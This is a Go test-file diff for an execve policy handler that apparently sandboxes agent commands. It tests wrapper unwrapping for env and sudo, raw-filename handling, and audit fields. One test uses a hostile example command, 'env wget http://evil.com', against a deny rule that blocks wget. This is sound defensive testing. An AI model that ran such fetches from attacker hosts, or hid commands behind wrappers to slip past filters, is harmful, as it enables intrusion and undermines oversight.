@@ -6,9 +6,11 @@ package unix
 import (
 	"context"
 	"fmt"
+	"path/filepath"
 	"testing"
 	"time"
 
+	"github.com/agentsh/agentsh/pkg/types"
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 	"golang.org/x/sys/unix"
@@ -519,6 +521,28 @@ func TestExecveHandler_TruncatedApproval_Timeout(t *testing.T) {
 	})
 }
 
+func TestExecveContext_RawFilename(t *testing.T) {
+	// Verify RawFilename is preserved through Handle
+	cfg := ExecveHandlerConfig{}
+	pol := &mockPolicy{decision: PolicyDecision{Decision: "allow", EffectiveDecision: "allow", Rule: "allow-all"}}
+	dt := NewDepthTracker()
+	dt.RegisterSession(1000, "sess-1")
+	h := NewExecveHandler(cfg, pol, dt, nil)
+
+	ctx := ExecveContext{
+		PID:         1001,
+		ParentPID:   1000,
+		Filename:    "/usr/bin/git",
+		RawFilename: "/proc/self/root/usr/bin/git",
+		Argv:        []string{"git", "status"},
+	}
+
+	result := h.Handle(context.Background(), ctx)
+	assert.True(t, result.Allow)
+	// RawFilename should be accessible on the context
+	assert.Equal(t, "/proc/self/root/usr/bin/git", ctx.RawFilename)
+}
+
 func TestExecveHandler_TruncatedApproval_NoApprover(t *testing.T) {
 	cfg := ExecveHandlerConfig{OnTruncated: "approval"}
 	dt := NewDepthTracker()
@@ -536,4 +560,138 @@ func TestExecveHandler_TruncatedApproval_NoApprover(t *testing.T) {
 	assert.False(t, result.Allow)
 	assert.Equal(t, ActionDeny, result.Action)
 	assert.Equal(t, "truncated_no_approver", result.Reason)
+}
+
+// mockPolicyWithUnwrap returns different decisions based on filename.
+type mockPolicyWithUnwrap struct {
+	decisions map[string]PolicyDecision
+}
+
+func (m *mockPolicyWithUnwrap) CheckExecve(filename string, argv []string, depth int) PolicyDecision {
+	if dec, ok := m.decisions[filename]; ok {
+		return dec
+	}
+	base := filepath.Base(filename)
+	if dec, ok := m.decisions[base]; ok {
+		return dec
+	}
+	return PolicyDecision{Decision: "deny", EffectiveDecision: "deny", Rule: "default-deny"}
+}
+
+// mockEmitter collects emitted events for test inspection.
+type mockEmitter struct {
+	events []types.Event
+}
+
+func (m *mockEmitter) AppendEvent(ctx context.Context, ev types.Event) error {
+	m.events = append(m.events, ev)
+	return nil
+}
+
+func (m *mockEmitter) Publish(ev types.Event) {}
+
+func TestExecveHandler_TransparentUnwrap_DenyPayload(t *testing.T) {
+	pol := &mockPolicyWithUnwrap{decisions: map[string]PolicyDecision{
+		"/usr/bin/env": {Decision: "allow", EffectiveDecision: "allow", Rule: "allow-env"},
+		"wget":         {Decision: "deny", EffectiveDecision: "deny", Rule: "block-wget", Message: "wget not allowed"},
+	}}
+	dt := NewDepthTracker()
+	dt.RegisterSession(1000, "sess-1")
+	h := NewExecveHandler(ExecveHandlerConfig{}, pol, dt, nil)
+
+	result := h.Handle(context.Background(), ExecveContext{
+		PID:       1001,
+		ParentPID: 1000,
+		Filename:  "/usr/bin/env",
+		Argv:      []string{"env", "wget", "http://evil.com"},
+	})
+
+	assert.False(t, result.Allow)
+	assert.Equal(t, ActionDeny, result.Action)
+	assert.Equal(t, "block-wget", result.Rule)
+	assert.Contains(t, result.Reason, "wget")
+}
+
+func TestExecveHandler_TransparentUnwrap_AllowPayload(t *testing.T) {
+	pol := &mockPolicyWithUnwrap{decisions: map[string]PolicyDecision{
+		"/usr/bin/env": {Decision: "allow", EffectiveDecision: "allow", Rule: "allow-env"},
+		"git":          {Decision: "allow", EffectiveDecision: "allow", Rule: "allow-git"},
+	}}
+	dt := NewDepthTracker()
+	dt.RegisterSession(1000, "sess-1")
+	h := NewExecveHandler(ExecveHandlerConfig{}, pol, dt, nil)
+
+	result := h.Handle(context.Background(), ExecveContext{
+		PID:       1001,
+		ParentPID: 1000,
+		Filename:  "/usr/bin/env",
+		Argv:      []string{"env", "git", "status"},
+	})
+
+	assert.True(t, result.Allow)
+	assert.Equal(t, ActionContinue, result.Action)
+}
+
+func TestExecveHandler_TransparentUnwrap_DenyWrapper(t *testing.T) {
+	pol := &mockPolicyWithUnwrap{decisions: map[string]PolicyDecision{
+		"/usr/bin/sudo": {Decision: "deny", EffectiveDecision: "deny", Rule: "block-sudo", Message: "sudo not allowed"},
+		"git":           {Decision: "allow", EffectiveDecision: "allow", Rule: "allow-git"},
+	}}
+	dt := NewDepthTracker()
+	dt.RegisterSession(1000, "sess-1")
+	h := NewExecveHandler(ExecveHandlerConfig{}, pol, dt, nil)
+
+	result := h.Handle(context.Background(), ExecveContext{
+		PID:       1001,
+		ParentPID: 1000,
+		Filename:  "/usr/bin/sudo",
+		Argv:      []string{"sudo", "git", "push"},
+	})
+
+	assert.False(t, result.Allow)
+	assert.Equal(t, ActionDeny, result.Action)
+	assert.Equal(t, "block-sudo", result.Rule)
+}
+
+func TestExecveHandler_TransparentUnwrap_NonTransparent(t *testing.T) {
+	pol := &mockPolicyWithUnwrap{decisions: map[string]PolicyDecision{
+		"/usr/bin/git": {Decision: "allow", EffectiveDecision: "allow", Rule: "allow-git"},
+	}}
+	dt := NewDepthTracker()
+	dt.RegisterSession(1000, "sess-1")
+	h := NewExecveHandler(ExecveHandlerConfig{}, pol, dt, nil)
+
+	result := h.Handle(context.Background(), ExecveContext{
+		PID:       1001,
+		ParentPID: 1000,
+		Filename:  "/usr/bin/git",
+		Argv:      []string{"git", "status"},
+	})
+
+	assert.True(t, result.Allow)
+	assert.Equal(t, ActionContinue, result.Action)
+	assert.Equal(t, "allow-git", result.Rule)
+}
+
+func TestExecveHandler_TransparentUnwrap_AuditFields(t *testing.T) {
+	pol := &mockPolicyWithUnwrap{decisions: map[string]PolicyDecision{
+		"/usr/bin/env": {Decision: "allow", EffectiveDecision: "allow", Rule: "allow-env"},
+		"git":          {Decision: "allow", EffectiveDecision: "allow", Rule: "allow-git"},
+	}}
+	dt := NewDepthTracker()
+	dt.RegisterSession(1000, "sess-1")
+	emitter := &mockEmitter{}
+	h := NewExecveHandler(ExecveHandlerConfig{}, pol, dt, emitter)
+
+	h.Handle(context.Background(), ExecveContext{
+		PID:       1001,
+		ParentPID: 1000,
+		Filename:  "/usr/bin/env",
+		Argv:      []string{"env", "git", "status"},
+	})
+
+	require.Len(t, emitter.events, 1)
+	ev := emitter.events[0]
+	assert.Equal(t, "/usr/bin/env", ev.UnwrappedFrom)
+	assert.Equal(t, "git", ev.PayloadCommand)
 }
